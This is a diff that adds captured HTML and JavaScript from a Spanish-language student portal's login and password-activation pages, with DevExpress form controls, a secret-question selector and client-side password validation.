+dxo.popupAnimationType='fade';
+dxo.popupHorizontalAlign='WindowCenter';
+dxo.popupVerticalAlign='WindowCenter';
+dxo.isPopupPositionCorrectionOn=false;
+dxo.width=350;
+dxo.widthFromServer=true;
+dxo.height=100;
+dxo.AfterCreate();
+
+//-->
+</script>
+         <input type="hidden" id="ppc_ActivaClaveWS" name="ppc_ActivaClaveWS" value="0:0:-1:-10000:-10000:0:500:150:1:0:0:0"><div id="ppc_ActivaClave_PW-1" class="dxpcLite_Aqua dxpclW dxpc-mainDiv dxpc-shadow" style="height:150px;width:500px;cursor:default;z-index:10000;display:none;visibility:hidden;">
+	<div class="dxpc-header dxpc-withBtn" id="ppc_ActivaClave_PWH-1">
+		<div class="dxpc-closeBtn" id="ppc_ActivaClave_HCB-1">
+			<img class="dxWeb_pcCloseButton_Aqua" src="/DXR.axd?r=1_19-FO8ck" alt="[Cerrar]">
+		</div><div class="dxpc-headerContent">
+			<span class="dxpc-headerText dx-vam" id="ppc_ActivaClave_PWH-1T">ACTIVAR CLAVE</span>
+		</div><b class="dx-clear"></b>
+	</div><div class="dxpc-contentWrapper">
+		<div class="dxpc-content" id="ppc_ActivaClave_PWC-1">
+			Estimado usuario, debe cambiar su clave asignada y completar los datos necesarios para recuperar su contraseña en caso de olvido, para continuar debe registrar todos los datos solictados.<br><span style="color:red">Te recordamos que esta es la misma clave que debes utilizar para acceder a la APP móvil.</span>
+                       <input type="hidden" id="ppc_ActivaClave_ASPxValidationSummary1_IE" name="ppc_ActivaClave_ASPxValidationSummary1_IE" value=""><table class="dxvsValidationSummary" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_ASPxValidationSummary1" style="border-collapse: collapse; display: none;">
+				<tbody><tr>
+					<td class="dxvsRC"><table class="dxvsT" cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;border-collapse:separate;">
+						<tbody>
+					</tbody></table></td>
+				</tr>
+			</tbody></table><script id="dxss_1072476935" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientValidationSummary('ppc_ActivaClave_ASPxValidationSummary1');
+window['ppc_ActivaClave_ASPxValidationSummary1'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$ASPxValidationSummary1';
+dxo.validationGroup = "ActivaClave";
+dxo.sampleErrorContainer = '<tr class="dxvsE"> <td class="dxvsETC"><a class="dxvsHL" href="javascript:;">&nbsp;</a></td></tr>';
+dxo.AfterCreate();
+
+//-->
+</script>
+                      <table>
+                           <tbody><tr>
+                               <td>Nueva Clave</td>
+                               <td>
+                                   <script id="dxss_926472333" type="text/javascript">
+<!--
+aspxAddDisabledItems('ppc_ActivaClave_txtContrasena',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtContrasena');
+window['txtContrasena'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtContrasena';
+dxo.Validation.AddHandler(function(s, e) { largoClave(s, e); });
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe ingresar clave') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.helpText = 'M&#225;ximo 10 caracteres';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.externalTableStyle=['dxeRoot', null];
+dxo.AfterCreate();
+
+//-->
+</script><table id="ppc_ActivaClave_txtContrasena_ET" cellpadding="0" cellspacing="0" class="dxeRoot"><tbody><tr><td><table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtContrasena" style="width:100px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtContrasena_I" name="ppc_ActivaClave$txtContrasena" onfocus="aspxEGotFocus('ppc_ActivaClave_txtContrasena')" onblur="aspxELostFocus('ppc_ActivaClave_txtContrasena')" onchange="aspxEValueChanged('ppc_ActivaClave_txtContrasena')" type="password" maxlength="10"></td>
+				</tr>
+			</tbody></table><input type="hidden" name="ppc_ActivaClave$txtContrasena$CVS" value=""></td></tr><tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Máximo 10 caracteres</label></td></tr></tbody></table>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Reingrese Clave</td>
+                               <td>
+                                   
+                                   <script id="dxss_519882400" type="text/javascript">
+<!--
+aspxAddDisabledItems('ppc_ActivaClave_txtContrasena2',[[['dxeDisabled'],[''],['','I']]]);
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtContrasena2');
+window['txtContrasena2'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtContrasena2';
+dxo.Validation.AddHandler(function(s, e) { ComparaClaves(s, e); });
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe validar clave') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.helpText = 'M&#225;ximo 10 caracteres';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.externalTableStyle=['dxeRoot', null];
+dxo.AfterCreate();
+
+//-->
+</script><table id="ppc_ActivaClave_txtContrasena2_ET" cellpadding="0" cellspacing="0" class="dxeRoot"><tbody><tr><td><table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtContrasena2" style="width:100px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtContrasena2_I" name="ppc_ActivaClave$txtContrasena2" onfocus="aspxEGotFocus('ppc_ActivaClave_txtContrasena2')" onblur="aspxELostFocus('ppc_ActivaClave_txtContrasena2')" onchange="aspxEValueChanged('ppc_ActivaClave_txtContrasena2')" type="password" maxlength="10"></td>
+				</tr>
+			</tbody></table><input type="hidden" name="ppc_ActivaClave$txtContrasena2$CVS" value=""></td></tr><tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Máximo 10 caracteres</label></td></tr></tbody></table>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Pregunta Secreta</td>
+                               <td>
+                                   <select name="ppc_ActivaClave$ddlPregunta" id="ppc_ActivaClave_ddlPregunta">
+				<option value="Pelicula Favorita">Pelicula Favorita</option>
+				<option value="Color Favorito">Color Favorito</option>
+				<option value="Cantante Favorito(a)">Cantante Favorito(a)</option>
+				<option value="Numero Favorito">Numero Favorito</option>
+				<option value="Musica Favorita">Musica Favorita</option>
+				<option value="Deporte Favorito">Deporte Favorito</option>
+				<option value="Comida Favorita ">Comida Favorita </option>
+				<option value="Actividad Favorita">Actividad Favorita</option>
+				<option value="Mascota Favorita">Mascota Favorita</option>
+
+			</select>
+                               </td>
+                           </tr>
+                           <tr>
+                               <td>Respuesta</td>
+                               <td>
+                                   <table class="dxeTextBoxSys dxeTextBox" cellspacing="0" cellpadding="0" id="ppc_ActivaClave_txtRespuesta" style="width:250px;border-collapse:collapse;">
+				<tbody><tr>
+					<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys" id="ppc_ActivaClave_txtRespuesta_I" name="ppc_ActivaClave$txtRespuesta" onfocus="aspxEGotFocus('ppc_ActivaClave_txtRespuesta')" onblur="aspxELostFocus('ppc_ActivaClave_txtRespuesta')" onchange="aspxEValueChanged('ppc_ActivaClave_txtRespuesta')" type="text" maxlength="50"></td>
+				</tr>
+			</tbody></table><script id="dxss_428502311" type="text/javascript">
+<!--
+
+var dxo = new ASPxClientTextBox('ppc_ActivaClave_txtRespuesta');
+window['ppc_ActivaClave_txtRespuesta'] = dxo;
+dxo.uniqueID = 'ppc_ActivaClave$txtRespuesta';
+dxo.validationGroup = "ActivaClave";
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('debe ingresar una respuesta') ];
+dxo.display = "None";
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.AfterCreate();
+
+//-->
+</script>
+                               <input type="hidden" name="ppc_ActivaClave$txtRespuesta$CVS" value=""></td>
+                           </tr>
+                           <tr>
+                               <td colspan="2" style="text-align:center">
+                                   <div class="dxbButton_Aqua dxbButtonSys dxbTSys" id="ppc_ActivaClave_btnActivaCalve" style="font-family:Arial;font-size:12px;font-weight:bold;height:22px;-khtml-user-select:none;">
+				<div class="dxb" id="ppc_ActivaClave_btnActivaCalve_CD">
+					<div class="dxb-hbc">
+						<input class="dxb-hb" value="Grabar" type="submit" name="ppc_ActivaClave$btnActivaCalve" readonly="readonly">
+					</div><span class="dx-vam">Grabar</span>
+				</div>
+			</div><script id="dxss_126980885" type="text/javascript">
+<!--
+aspxAddHoverItems('ppc_ActivaClave_btnActivaCalve',[[['dxbButtonHover_Aqua'],[''],[''],['','TC']]]);
+aspxAddPressedItems('ppc_ActivaClave_btnActivaCalve',[[['dxbButtonPressed_Aqua'],[''],[''],['','TC']]]);
+
+var dxo = new ASPxClientButton('ppc_ActivaClave_btnActivaCalve');
+window['ppc_ActivaClave_btnActivaCalve'] = dxo;
+dxo.autoPostBack = true;
+dxo.uniqueID = 'ppc_ActivaClave$btnActivaCalve';
+dxo.RegisterServerEventAssigned(['Click']);
+aspxAddSelectedItems('ppc_ActivaClave_btnActivaCalve',[[['dxbf'],[''],['CD']]]);
+dxo.validationGroup = "ActivaClave";
+dxo.AfterCreate();
+
+//-->
+</script>
+                               </td>
+                           </tr>
+                       </tbody></table>
+                   
+		</div>
+	</div>
+</div><div id="ppc_ActivaClave_DXPWMB-1" class="dxpcModalBackLite_Aqua" style="z-index:9999;">
+
+</div><table id="ppc_ActivaClave_LP" class="dxpcLoadingPanel_Aqua dxlpLoadingPanel_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;left:0px;top:0px;z-index:30000;display:none;">
+	<tbody><tr>
+		<td class="dx"><img class="dxlp-loadingImage dxlp-imgPosTop" src="/DXR.axd?r=1_19-FO8ck" alt="" align="middle"><br><span id="ppc_ActivaClave_TL">Cargando…</span></td>
+	</tr>
+</tbody></table><div id="ppc_ActivaClave_LD" class="dxpcLoadingDiv_Aqua dxlpLoadingDiv_Aqua dx-ft" style="left:0px;top:0px;z-index:29999;display:none;position:absolute;">
+
+</div><script id="dxss_1394382019" type="text/javascript">
+<!--
+aspxAddHoverItems('ppc_ActivaClave',[[['dxpc-closeBtnHover'],[''],['HCB-1']]]);
+
+var dxo = new ASPxClientPopupControl('ppc_ActivaClave');
+window['ppc_ActivaClave'] = dxo;
+dxo.encodeHtml = false;
+dxo.callBack = function(arg) { WebForm_DoCallback('ppc_ActivaClave',arg,aspxCallback,'ppc_ActivaClave',aspxCallbackError,true); };
+dxo.enableAnimation=false;
+dxo.popupAction='MouseOver';
+dxo.closeAction='CloseButton';
+dxo.popupHorizontalAlign='WindowCenter';
+dxo.popupVerticalAlign='WindowCenter';
+dxo.isPopupPositionCorrectionOn=false;
+dxo.width=500;
+dxo.widthFromServer=true;
+dxo.height=150;
+dxo.defaultWindowPopupElementIDList=['popup'];
+dxo.AfterCreate();
+
+//-->
+</script>
+    
+
+<script type="text/javascript">
+//<![CDATA[
+
+var callBackFrameUrl='/WebResource.axd?d=myfKNOXtGKNRwJ8HHeqsqFd8c0-zv6xz22B13Zl7UDCtR4PfOzzs3pmXJOh9dFIIoWLUsp6CWpso-4vRVOSqM2LkY5Yz4w60Eyo5Cn-tSy41&t=638942102819057530';
+WebForm_InitCallback();//]]>
+</script>
+<input type="hidden" name="DXScript" id="DXScript" value="1_187,1_101,1_180,1_98,1_172,1_178,1_163,1_142,1_130,1_137,1_121,1_170,1_139"><input type="hidden" name="DXCss" id="DXCss" value="../css/login.css,1_14,1_16,1_1,0_275,0_279,1_7,1_8,1_6,0_105,0_107"></form>
+    <script type="application/javascript" src="https://api.ipify.org?format=jsonp&amp;callback=getIP"></script>
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v4513226cdae34746b4dedf0b4dfa099e1781791509496" integrity="sha512-ZE9pZaUXND66v380QUtch/5sE9tPFh2zg45pR2PB0CVkCtOREv2AJKkSidISWkysEuQ0EH8faUU5du78bx87UQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;7492d97e98584332b31c700b9b368fcf&quot;}" crossorigin="anonymous"></script>
+
+
+<audio class="audio-output" style="display: none;"></audio><div id="volume-booster-visusalizer">
+                    <div class="sound">
+                        <div class="sound-icon"></div>
+                        <div class="sound-wave sound-wave_one"></div>
+                        <div class="sound-wave sound-wave_two"></div>
+                        <div class="sound-wave sound-wave_three"></div>
+                    </div>
+                    <div class="segments-box">
+                        <div data-range="1-20" class="segment"><span></span></div>
+                        <div data-range="21-40" class="segment"><span></span></div>
+                        <div data-range="41-60" class="segment"><span></span></div>
+                        <div data-range="61-80" class="segment"><span></span></div>
+                        <div data-range="81-100" class="segment"><span></span></div>
+                    </div>
+                </div></body>
+
+                <html xmlns="http://www.w3.org/1999/xhtml" class="dxChrome dxWindowsPlatform dxWebKitFamily dxBrowserVersion-150"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <title>Zona Estudiantes</title>
+    <link href="../css/login.css" rel="stylesheet">
+    <script src="../js/validaciones.js"></script>
+    <script>
+        function ComparaClaves(s, e) {
+            clave = txtContrasena.GetText();
+            claveConf = txtContrasena2.GetText();
+
+            if (clave != claveConf) {
+                e.isValid = false;
+                e.errorText = "Las claves ingresadas no coinciden";
+            }
+        }
+        function largoClave(s, e) {
+            var clave = txtContrasena.GetText();
+            var rut = txtRut.GetValue();
+            var rutDV = txtRut.GetValue();
+            var rutCompleto = rutDV
+
+            if (clave.length < 8) {
+                e.isValid = false;
+                e.errorText = "La Clave debe contener como minimo 8 caracteres";
+            }
+            if (clave == rut || clave == rutDV || clave == rutCompleto) {
+                e.isValid = false;
+                e.errorText = "La Clave debe ser distinta del rut";
+            }
+            if (clave == "12345678" || clave == "87654321" || clave == "01234567" || clave == "76543210" || clave == "23456789" || clave == "98765432") {
+                e.isValid = false;
+                e.errorText = "La Clave debe ser distinta de: 12345678,87654321,01234567,76543210,23456789,98765432";
+            }
+        }
+        function DetectarBloqueador() {
+            var ventana = 'habilitada';
+            var popUp = window.open('', ventana, 'width=1000, height=700, left=24, top=24, scrollbars, resizable');
+            if (popUp == null || typeof (popUp) == 'undefined') {
+                alert('Las ventanas emergentes estan bloqueadas en el explorador, para un correcto funcionamiento de la zona deben estar habilitadas.');
+            } else {
+                popUp.close();
+
+            }
+        }
+        function getIP(json) {
+            txtIP.SetText(json.ip);
+        }
+    </script>
+<style></style><style></style></head>
+<body onload="DetectarBloqueador();">
+    <form method="post" action="./login.aspx?ReturnUrl=%2festudiantes%2fdatos_pers.aspx" id="form1">
+<div class="aspNetHidden">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUKMTcyNTg4OTA5MA9kFgICAQ9kFgYCAQ88KwAIAQAPFgIeDl8hVXNlVmlld1N0YXRlZ2QWAmYPZBYCZg9kFgJmD2QWAgIBDzwrAAkBAA8WAh8AZ2RkAgUPPCsACAEADxYCHwBnZGQCBw88KwAIAQAPFgIfAGdkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WCAUWcG5sTWVudSRtbnVFc3R1ZGlhbnRlcwUPQVNQeFJvdW5kUGFuZWwxBRhBU1B4Um91bmRQYW5lbDEkZnJtTG9naW4FJEFTUHhSb3VuZFBhbmVsMSRmcm1Mb2dpbiRidG5JbmdyZXNhcgUKcHBjTWVuc2FqZQUPcHBjX0FjdGl2YUNsYXZlBSZwcGNfQWN0aXZhQ2xhdmUkQVNQeFZhbGlkYXRpb25TdW1tYXJ5MQUecHBjX0FjdGl2YUNsYXZlJGJ0bkFjdGl2YUNhbHZlqpNb6h1yhrWLQHGC/Ko6TnWp0JDbn8DgT9oUt3u1Klg=">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['form1'];
+if (!theForm) {
+    theForm = document.form1;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="/WebResource.axd?d=ltXxBVJPp9bUNc9kdH19ks5KLCAKYPOGzHj6pUbLjUfEbShmj2lO1SoFpiCduCcWicztERegHWakIzKSfIQmk6x1ASIVgc6CbPGw2bNmt5Y1&amp;t=638942102819057530" type="text/javascript"></script>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="1806D926">
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAuxnUEKAY2HbjHjnCbtlL961bODHUqmMErpwujLKCaDPA0piYeZFS6+SheeQihfRxeJikp9AAQYhjkvGo5sHqxWnNalBvw0HxZOkf5ULVV6ZXBDlDhGEJIvlyDKnSVkZS/Eg04kweFP3lusTKAYddL7e2cE7G3VtnRMFrm5LE9/Zb3XXNRx1FAIekCPXYwmDzRNpgh0ZFRlO2NMyBgM7SYUzbX8ghZ9hsowNThkAEQYT8ffiSR6iBc+yjgf0smD1OyfeRdUhIYXkF48TiQxUAv8">
+</div>
+    <div id="cont_ppal">
+        <div id="header"></div>
+        <div id="contenido">
+            <div id="mnu">
+                <script id="dxis_1039134530" src="/DXR.axd?r=1_187,1_101,1_180,1_98,1_172,1_178,1_163,1_142,1_130,1_137,1_121,1_170,1_139-FO8ck" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="/DXR.axd?r=1_14,1_16,1_1,0_275,0_279,1_7,1_8,1_6,0_105,0_107-JO8ck"><div class="dxpnlControl pnlCenter" dir="rtl" id="pnlMenu" style="background-color:#004677;padding-left:0px;padding-right:0px;padding-top:0px;padding-bottom:0px;">
+	
+                            <div class="dxmLite dxm-rtl">
+		<div class="dxm-main dxm-horizontal" id="pnlMenu_mnuEstudiantes" style="background-color: rgb(0, 70, 119); border-style: none; vertical-align: middle;">
+			<ul class="dx dxm-image-r" style="">
+				<li title="Acceso Estudiantes" class="dxm-item" style="border-style: none; border-right-color: white; border-right-width: 1px; min-width: 39px;" id="pnlMenu_mnuEstudiantes_DXI0_"><a class="dxm-content dx" href="../estudiantes/datos_pers.aspx" title="Acceso Estudiantes" style="color: white;" id="pnlMenu_mnuEstudiantes_DXI0_T"><img class="dxm-image dx-vam" src="../img/login/login.png" alt="" id="pnlMenu_mnuEstudiantes_DXI0_Img"></a></li><li class="dxm-spacing" id="pnlMenu_mnuEstudiantes_DXI0_II" style="height: 31px;"></li><li title="Ir al Home" class="dxm-item" style="background-color: rgb(0, 70, 119); border-style: none; border-right-color: white; border-right-width: 1px; min-width: 37px;" id="pnlMenu_mnuEstudiantes_DXI1_"><a class="dxm-content dx" href="../index.aspx" title="Ir al Home" style="color: white;" id="pnlMenu_mnuEstudiantes_DXI1_T"><img class="dxm-image dx-vam" src="../img/zona_estudiante/home2.gif" alt="" id="pnlMenu_mnuEstudiantes_DXI1_Img"></a></li>
+			</ul>
+		</div><b class="dx-clear"></b>
+	</div><script id="dxss_1280346417" type="text/javascript">
+<!--
+aspxAddHoverItems('pnlMenu_mnuEstudiantes',[[['dxm-hovered',''],['border-bottom-style:None;border-top-style:None;border-left-style:None;border-right-color:White;border-right-style:None;border-right-width:1px;color:#FD9705;background-color:#3399FF;',''],['DXI0_','DXI1_'],['','T']],[['dxm-scrollBtnHovered'],[''],['DXSB0_U','DXSB0_D']]]);
+
+var dxo = new ASPxClientMenu('pnlMenu_mnuEstudiantes');
+window['pnlMenu_mnuEstudiantes'] = dxo;
+dxo.uniqueID = 'pnlMenu$mnuEstudiantes';
+dxo.rtl = true;
+dxo.renderData={'':[[0],[1]]};
+dxo.scrollInfo=['0'];
+dxo.AfterCreate();
+
+//-->
+</script>
+                        
+</div>
+            </div>
+            <div id="left">
+
+            </div>
+            <div id="login">
+                <div id="formulario">
+                    <table class="dxrpControl_Aqua" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1" style="width:200px;border-collapse:collapse;border-collapse:separate;">
+	<tbody><tr>
+		<td id="ASPxRoundPanel1_HC" class="dxrpHeader_Aqua dx-borderBox"><span id="ASPxRoundPanel1_RPHT" class="dxrpHT dx-vam">Acceso Zona Estudiantes</span></td>
+	</tr><tr class="dxrpCR">
+		<td id="ASPxRoundPanel1_RPC" class="dxrp dxrpcontent dx-borderBox" style="width:100%;"><div class="dxrpAW">
+			<div class="dx-borderBox dxrpCW">
+				
+                                <div class="dxflFormLayout_Aqua" id="ASPxRoundPanel1_frmLogin">
+					<table class="dxflGroup_Aqua dxflGroupSys dxflAGSys" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+						<tbody><tr>
+							<td id="ASPxRoundPanel1_frmLogin_0" class="dxflGroupCell_Aqua"><table class="dxflCLLSys dxflItemSys dxflTextEditItemSys dxflItem_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+								<tbody><tr>
+									<td class="dxflHALSys dxflVATSys dxflCaptionCell_Aqua dxflCaptionCellSys" style="width: 40px;"><label class="dxflCaption_Aqua" for="ASPxRoundPanel1_frmLogin_txtRut_I">RUT:</label><em class="dxflRequired_Aqua">*</em></td><td class="dxflNestedControlCell_Aqua">
+                                                    <input type="hidden" id="ASPxRoundPanel1_frmLogin_txtRut_Raw" name="ASPxRoundPanel1_frmLogin_txtRut_Raw" value=""><table id="ASPxRoundPanel1_frmLogin_txtRut_ET" class="dxeValidDynEditorTable dxeRoot" cellspacing="0" cellpadding="0" style="border-collapse:collapse;" errorframe="errorFrame">
+										<tbody><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtRut_CC"><table class="dxeTextBoxSys dxeTextBox dxeNullText dxh0" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtRut" style="width:170px;border-collapse:collapse;" savedspellcheck="[object Object]" spellcheck="false">
+												<tbody><tr>
+													<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys dxh0" name="ASPxRoundPanel1$frmLogin$txtRut" value="Ej.:12345678" maxlength="8" id="ASPxRoundPanel1_frmLogin_txtRut_I" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtRut')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtRut')" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtRut')" type="text" autocomplete="off" savedspellcheck="[object Object]" spellcheck="false"></td>
+												</tr>
+											</tbody></table><input type="hidden" name="ASPxRoundPanel1$frmLogin$txtRut$CVS" value=""></td>
+										</tr><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtRut_EC" class="dxeErrorCell dxeErrorFrame dxeErrorFrameSys dxeErrorCellSys dxeNoBorderTop" style="display:none;"><table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+												<tbody><tr>
+													<td><img id="ASPxRoundPanel1_frmLogin_txtRut_EI" class="dxEditors_edtError" src="/DXR.axd?r=1_19-FO8ck" alt=""></td><td id="ASPxRoundPanel1_frmLogin_txtRut_ETC" style="width:100%;white-space:nowrap;">Valor no válido</td>
+												</tr>
+											</tbody></table></td>
+										</tr>
+									<tr><td class="dxeHelpText dxeVHelpTextSys" style="z-index: -41998; text-align: left; vertical-align: top;"><label>Sin puntos, guión y digito verificador</label></td></tr></tbody></table><script id="dxss_1539610516" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtRut',[[['dxeDisabled'],[''],['','I']]]);
+document.getElementById("ASPxRoundPanel1_frmLogin_txtRut_ET").setAttribute("errorFrame", "errorFrame");
+document.getElementById("ASPxRoundPanel1_frmLogin_txtRut_I").setAttribute("autocomplete", "off");
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtRut');
+window['txtRut'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtRut';
+dxo.KeyPress.AddHandler(function(s, e) { SoloNumeros(s, e); });
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('Ingrese RUT') ];
+dxo.display = "Dynamic";
+dxo.errorImageIsAssigned = true;
+dxo.controlCellStyles = { cssClass: 'dxeErrorFrame dxeErrorFrameSys dxeNoBorderBottom dxeControlsCell', style: "" };
+dxo.RequireStyleDecoration();
+dxo.styleDecoration.AddStyle('I','dxeInvalid','');
+dxo.styleDecoration.AddStyle('F','dxeFocused','');
+dxo.styleDecoration.AddStyle('N','dxeNullText','');
+dxo.nullText = 'Ej.:12345678';
+dxo.helpText = 'Sin puntos, gui&#243;n y digito verificador';
+dxo.helpTextDisplayMode = 'Inline';
+dxo.helpTextPosition = 'Bottom';
+dxo.helpTextStyle=['dxeHelpText', null];
+dxo.errorCellPosition = 'Bottom';
+dxo.AfterCreate();
+
+//-->
+</script>
+                                                    
+                                                </td>
+								</tr>
+							</tbody></table></td>
+						</tr><tr>
+							<td id="ASPxRoundPanel1_frmLogin_1" class="dxflGroupCell_Aqua"><table class="dxflCLLSys dxflItemSys dxflTextEditItemSys dxflItem_Aqua" cellspacing="0" cellpadding="0" style="border-collapse:collapse;border-collapse:separate;">
+								<tbody><tr>
+									<td class="dxflHALSys dxflVATSys dxflCaptionCell_Aqua dxflCaptionCellSys" style="width: 40px;"><label class="dxflCaption_Aqua" for="ASPxRoundPanel1_frmLogin_txtClave_I_CLND">Clave:</label><em class="dxflRequired_Aqua">*</em></td><td class="dxflNestedControlCell_Aqua">
+                                                    <input type="hidden" id="ASPxRoundPanel1_frmLogin_txtClave_Raw" name="ASPxRoundPanel1_frmLogin_txtClave_Raw" value=""><table id="ASPxRoundPanel1_frmLogin_txtClave_ET" class="dxeValidDynEditorTable dxeRoot" cellspacing="0" cellpadding="0" style="border-collapse:collapse;" errorframe="errorFrame">
+										<tbody><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtClave_CC"><table class="dxeTextBoxSys dxeTextBox dxeNullText dxh0" cellspacing="0" cellpadding="0" id="ASPxRoundPanel1_frmLogin_txtClave" style="width:170px;border-collapse:collapse;" savedspellcheck="[object Object]" spellcheck="false">
+												<tbody><tr>
+													<td class="dxic" style="width:100%;"><input class="dxeEditArea dxeEditAreaSys dxh0" id="ASPxRoundPanel1_frmLogin_txtClave_I" name="ASPxRoundPanel1$frmLogin$txtClave" onfocus="aspxEGotFocus('ASPxRoundPanel1_frmLogin_txtClave')" onblur="aspxELostFocus('ASPxRoundPanel1_frmLogin_txtClave')" onchange="aspxEValueChanged('ASPxRoundPanel1_frmLogin_txtClave')" type="password" maxlength="10" autocomplete="off" savedspellcheck="[object Object]" spellcheck="false" saveddisplay="[object Object]" style="display: none;"><input class="dxeEditArea dxeEditAreaSys dxh0" id="ASPxRoundPanel1_frmLogin_txtClave_I_CLND" type="text" tabindex="0" saveddisplay="[object Object]" style=""></td>
+												</tr>
+											</tbody></table><input type="hidden" name="ASPxRoundPanel1$frmLogin$txtClave$CVS" value=""></td>
+										</tr><tr>
+											<td id="ASPxRoundPanel1_frmLogin_txtClave_EC" class="dxeErrorCell dxeErrorFrame dxeErrorFrameSys dxeErrorCellSys dxeNoBorderTop" style="display:none;"><table cellspacing="0" cellpadding="0" style="width:100%;border-collapse:collapse;">
+												<tbody><tr>
+													<td><img id="ASPxRoundPanel1_frmLogin_txtClave_EI" class="dxEditors_edtError" src="/DXR.axd?r=1_19-FO8ck" alt=""></td><td id="ASPxRoundPanel1_frmLogin_txtClave_ETC" style="width:100%;white-space:nowrap;">Valor no válido</td>
+												</tr>
+											</tbody></table></td>
+										</tr>
+									</tbody></table><script id="dxss_356747159" type="text/javascript">
+<!--
+aspxAddDisabledItems('ASPxRoundPanel1_frmLogin_txtClave',[[['dxeDisabled'],[''],['','I']]]);
+document.getElementById("ASPxRoundPanel1_frmLogin_txtClave_ET").setAttribute("errorFrame", "errorFrame");
+document.getElementById("ASPxRoundPanel1_frmLogin_txtClave_I").setAttribute("autocomplete", "off");
+
+var dxo = new ASPxClientTextBox('ASPxRoundPanel1_frmLogin_txtClave');
+window['txtClave'] = dxo;
+dxo.uniqueID = 'ASPxRoundPanel1$frmLogin$txtClave';
+dxo.customValidationEnabled = true;
+dxo.isValid = true;
+dxo.errorText = 'Valor no válido';
+dxo.validationPatterns = [ new ASPxRequiredFieldValidationPattern('Ingrese Clave') ];
+dxo.display = "Dynamic";
+dxo.errorImageIsAssigned = true;
